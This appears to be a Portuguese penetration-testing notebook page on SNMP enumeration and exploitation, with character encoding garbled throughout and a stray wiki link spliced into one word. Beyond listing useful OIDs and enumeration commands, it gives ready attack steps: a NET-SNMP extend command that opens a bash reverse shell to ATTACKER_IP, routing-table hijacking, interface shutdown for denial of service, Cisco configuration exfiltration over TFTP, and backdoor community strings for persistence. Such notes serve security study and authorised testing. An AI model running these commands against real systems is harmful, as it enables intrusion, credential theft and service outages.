# 02 - Enumera√ß√£o SNMP

> Porta 161 UDP
> Porta 162 UDP (SNMP Trap)

## üìã √çndice

1. [MIBs √öteis para Pentest](#mibs-√∫teis-para-pentest)
2. [Como Usar SNMP no Pentest](#como-usar-snmp-no-pentest)
3. [Explorando Permiss√£o de Escrita](#explorando-permiss√£o-de-escrita)
4. [Exemplo Pr√°tico Completo](#exemplo-pr√°tico-completo)
5. [Checklist de Explora√ß√£o](#checklist-de-explora√ß√£o-snmp)

---

## üìä MIBs √öteis para Pentest

### 1. MIBs de Sistema e Informa√ß√µes Gerais

```bash
# System MIB (1.3.6.1.2.1.1)
1.3.6.1.2.1.1.1.0     # sysDescr - Descri√ß√£o do sistema
1.3.6.1.2.1.1.3.0     # sysUpTime - Tempo de atividade
1.3.6.1.2.1.1.4.0     # sysContact - Contato do sistema
1.3.6.1.2.1.1.5.0     # sysName - Nome do sistema
1.3.6.1.2.1.1.6.0     # sysLocation - Localiza√ß√£o
```

### 2. MIBs de Usu√°rios e Processos (CR√çTICO)

```bash
# Processos em execu√ß√£o (1.3.6.1.2.1.25.4.2.1.2)
1.3.6.1.2.1.25.4.2.1.2      # hrSWRunName - Programas rodando

# Usu√°rios locais (Windows) (1.3.6.1.4.1.77.1.2.25)
1.3.6.1.4.1.77.1.2.25       # Nomes de usu√°rios

# Par√¢metros de processos
1.3.6.1.2.1.25.4.2.1.4      # hrSWRunPath - Caminho completo do processo
1.3.6.1.2.1.25.4.2.1.5      # hrSWRunParameters - Par√¢metros (pode conter senhas!)
```

### 3. MIBs de Rede e Interfaces

```bash
# Interfaces de rede (1.3.6.1.2.1.2.2.1)
1.3.6.1.2.1.2.2.1.2         # ifDescr - Descri√ß√£o das interfaces
1.3.6.1.2.1.2.2.1.6         # ifPhysAddress - Endere√ßos MAC

# Tabela ARP (1.3.6.1.2.1.4.22.1.2)
1.3.6.1.2.1.4.22.1.2        # ipNetToMediaPhysAddress - Mapeamento IP-MAC

# Tabela de roteamento (1.3.6.1.2.1.4.21.1)
1.3.6.1.2.1.4.21.1.1        # ipRouteDest - Destinos de rotas
1.3.6.1.2.1.4.21.1.7        # ipRouteNextHop - Pr√≥ximo hop

# Conex√µes TCP abertas (1.3.6.1.2.1.6.13.1)
1.3.6.1.2.1.6.13.1.2        # tcpConnLocalAddress
1.3.6.1.2.1.6.13.1.3        # tcpConnLocalPort
1.3.6.1.2.1.6.13.1.4        # tcpConnRemAddress
1.3.6.1.2.1.6.13.1.5        # tcpConnRemPort
```

### 4. MIBs de Software e Storage

```bash
# Software instalado (1.3.6.1.2.1.25.6.3.1.2)
1.3.6.1.2.1.25.6.3.1.2      # hrSWInstalledName

# Dispositivos de armazenamento (1.3.6.1.2.1.25.2.3.1)
1.3.6.1.2.1.25.2.3.1.3      # hrStorageDescr - Descri√ß√£o do storage
1.3.6.1.2.1.25.2.3.1.4      # hrStorageAllocationUnits
1.3.6.1.2.1.25.2.3.1.5      # hrStorageSize
```

### 5. MIBs Espec√≠ficos por Fabricante (MUITO √öTIL)

```bash
# Windows (1.3.6.1.4.1.77.1)
1.3.6.1.4.1.77.1.2.25       # Usu√°rios locais
1.3.6.1.4.1.77.1.2.3.1.1    # Shares de rede
1.3.6.1.4.1.77.1.2.27       # Dom√≠nio do sistema

# Cisco IOS (1.3.6.1.4.1.9)
1.3.6.1.4.1.9.2.1.61.0      # avgBusy5 - CPU usage
1.3.6.1.4.1.9.9.48.1.1.1.5  # cpmCPUTotal5min

# Linux (NET-SNMP) (1.3.6.1.4.1.2021)
1.3.6.1.4.1.2021.10.1.3.1   # Load average
```

---

## üîç Como Usar SNMP no Pentest

### Fase 1: Descoberta e Enumera√ß√£o

```bash
# 1. Descobrir hosts com SNMP ativo
sudo nmap -sU -p 161 --open 192.168.1.0/24

# 2. Bruteforce de community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET_IP

# Ou com snmpwalk
for comm in public private manager admin; do
    echo "Testando: $comm"
    snmpwalk -c $comm -v1 TARGET_IP 2>/dev/null && echo "[+] $comm funciona!"
done

# 3. Enumera√ß√£o completa com community v√°lida
snmpwalk -c public -v2c TARGET_IP
```

### Fase 2: Extra√ß√£o de Informa√ß√µes Sens√≠veis

```bash
# Listar TODOS os usu√°rios (Windows)
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.4.1.77.1.2.25

# Listar processos (pode revelar senhas em linha de comando)
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.4.2.1.5  # Par√¢metros!

# Listar shares de rede
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.4.1.77.1.2.3.1.1

# Software instalado (procure por vers√µes vulner√°veis)
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.25.6.3.1.2

# Conex√µes TCP ativas (pode revelar backdoors/C2)
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.6.13.1

# Informa√ß√µes de rede interna
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.4.21.1  # Rotas
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.4.22.1  # ARP
```

### Fase 3: Ferramentas Automatizadas

```bash
# snmp-check (muito √∫til!)
snmp-check -c public TARGET_IP

# Metasploit
msfconsole
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET_IP
set COMMUNITY public
run

# Braa (mais r√°pido que snmpwalk)
braa public@TARGET_IP:.1.3.6.*
```

---

## üî• Explorando Permiss√£o de Escrita (CRITICAL!)

### Por que √© Perigoso?

Quando voc√™ tem uma **community string com permiss√£o de escrita** (geralmente "private"), voc√™ pode:
1. **Modificar configura√ß√µes do sistema**
2. **Alterar tabelas de roteamento**
3. **Executar comandos** (em alguns casos)
4. **Criar backdoors**
5. **Causar DoS**

### Testando Permiss√£o de Escrita

```bash
# Tentar escrever no sysContact (teste seguro)
snmpset -c private -v1 TARGET_IP 1.3.6.1.2.1.1.4.0 s "Teste"

# Se funcionar, voc√™ tem write access!
snmpget -c private -v1 TARGET_IP 1.3.6.1.2.1.1.4.0
```

### T√©cnicas de Explora√ß√£o com Write Access

#### 1. Modificar Tabela de Roteamento (Man-in-the-Middle)

```bash
# Redirecionar tr√°fego para seu IP
snmpset -c private -v1 TARGET_IP 1.3.6.1.2.1.4.21.1.7.DEST_IP i YOUR_IP
```

#### 2. Desabilitar Interfaces de Rede (DoS)

```bash
# Descobrir √≠ndice da interface
snmpwalk -c public -v1 TARGET_IP 1.3.6.1.2.1.2.2.1.2

# Desabilitar interface (ifAdminStatus = 2)
snmpset -c private -v1 TARGET_IP 1.3.6.1.2.1.2.2.1.7.INDEX i 2
```

#### 3. Modificar Community Strings

```bash
# Em alguns dispositivos voc√™ pode mudar a pr√≥pria community string!
snmpset -c private -v1 TARGET_IP 1.3.6.1.6.3.15.1.2.2.1.6.6.112.117.98.108.105.99 s "backdoor"
```

#### 4. Execu√ß√£o Remota de Comandos (NET-SNMP Extended MIB)

**ATEN√á√ÉO**: Isto funciona em sistemas Linux com NET-SNMP configurado com `extend` ou `exec`.

```bash
# Verificar se h√° comandos extend configurados
snmpwalk -c public -v1 TARGET_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# Se NET-SNMP estiver com escrita, criar comando malicioso
# OID base para extend: 1.3.6.1.4.1.8072.1.3.2

# Criar novo comando extend
snmpset -c private -v2c TARGET_IP \
  'nsExtendStatus."evilcommand"'  = createAndGo \
  'nsExtendCommand."evilcommand"' = /bin/bash \
  'nsExtendArgs."evilcommand"'    = '-c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# Executar o comando
snmpwalk -c public -v1 TARGET_IP 'nsExtendOutputFull."evilcommand"'
```

#### 5. Explora√ß√£o Cisco IOS (RCE)

Em dispositivos Cisco, voc√™ pode fazer **download/upload de configura√ß√µes**:

```bash
# Download da config (requer TFTP server)
snmpset -c private -v1 CISCO_IP \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 \     # ciscoConfigCopyProtocol (1=tftp)
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 a YOUR_IP \ # TFTP server
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 s "config.txt" \ # Filename
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1        # Start copy

# Voc√™ receber√° o arquivo de configura√ß√£o com senhas!
```

#### 6. Modificar Configura√ß√£o SNMP para Persist√™ncia

```bash
# Adicionar nova community string de escrita
snmpset -c private -v1 TARGET_IP \
  1.3.6.1.6.3.15.1.2.2.1.3.backdoor i 2  # readWrite
```

---

## üõ†Ô∏è Exemplo Pr√°tico Completo

```bash
#!/bin/bash
TARGET="192.168.1.100"

# 1. Descoberta
echo "[*] Testando SNMP..."
nmap -sU -p 161 --open $TARGET

# 2. Bruteforce de communities
echo "[*] Bruteforcing communities..."
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET

# 3. Enumera√ß√£o (assumindo public funciona)
echo "[*] Enumerando sistema..."
snmpwalk -c public -v2c $TARGET 1.3.6.1.2.1.1 > system_info.txt

# 4. Extrair usu√°rio[[03.01 - Explora√ß√£o Web]]s
echo "[*] Extraindo usu√°rios..."
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25 > users.txt

# 5. Extrair processos
echo "[*] Extraindo processos..."
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 > processes.txt

# 6. Testar write access
echo "[*] Testando escrita..."
if snmpset -c private -v1 $TARGET 1.3.6.1.2.1.1.4.0 s "PwnTest" 2>/dev/null; then
    echo "[+] WRITE ACCESS OBTIDO!"
    # Aqui voc√™ pode executar comandos maliciosos
fi

echo "[*] Enumera√ß√£o conclu√≠da!"
```

---

## üìù Checklist de Explora√ß√£o SNMP

- [ ] Descobrir portas 161/UDP abertas
- [ ] Bruteforce de community strings (public, private, manager)
- [ ] Enumerar informa√ß√µes do sistema
- [ ] Extrair lista de usu√°rios
- [ ] Listar processos e par√¢metros (buscar senhas)
- [ ] Enumerar software instalado
- [ ] Mapear rede interna (rotas, ARP)
- [ ] Listar shares de rede
- [ ] Verificar conex√µes TCP ativas
- [ ] Testar permiss√£o de escrita
- [ ] Se write: tentar RCE via extend/exec
- [ ] Se write: tentar modificar rotas
- [ ] Se write: criar backdoor SNMP
- [ ] Documentar todas as descobertas

---

## üìö Recursos Adicionais

### Wordlists √öteis

```bash
/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

### Sites de Refer√™ncia

- **www.oid-info.com** - Banco de dados completo de OIDs
- **www.mibdepot.com** - Reposit√≥rio de MIBs

### Ferramentas Essenciais

```bash
# Instala√ß√£o b√°sica
sudo apt install snmp snmp-mibs-downloader
sudo apt install onesixtyone
sudo apt install snmp-check
sudo apt install braa

# Habilitar MIBs (remover coment√°rio)
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf
```

### Tradu√ß√£o de OIDs

```bash
# Instalar MIBs
apt install snmp-mibs-downloader
echo "" > /etc/snmp/snmp.conf

# Traduzir OID para nome leg√≠vel
snmptranslate -TB icmp
snmptranslate -Td IP-MIB::icmpInEchos

# Converter nome para OID
snmptranslate -On SNMPv2-MIB::sysDescr.0
```

---

## ‚ö†Ô∏è Observa√ß√µes Importantes

1. **SNMPv1 e v2c** n√£o t√™m criptografia - community strings em texto claro
2. **Community strings** s√£o essencialmente senhas compartilhadas
3. **"public"** √© quase sempre read-only, **"private"** geralmente √© read-write
4. Em pentests reais, voc√™ pode encontrar **senhas em par√¢metros de processos**
5. Write access pode levar a **RCE completo** dependendo do sistema
6. **SNMPv3** √© mais seguro (autentica√ß√£o e criptografia), mas configura√ß√µes fracas ainda podem ser exploradas
7. SNMP geralmente √© **esquecido** em configura√ß√µes de seguran√ßa - alvo f√°cil!
8. Sempre documente **community strings** v√°lidas para uso posterior

---

## üîó Ver Tamb√©m

- [[02.02 - Enumera√ß√£o de Servi√ßos#9. Enumera√ß√£o SNMP]]
- [[03.03 - Brute Force e Quebra de Senhas]]
- [[99 - Dicas R√°pidas - Desbloqueio]]

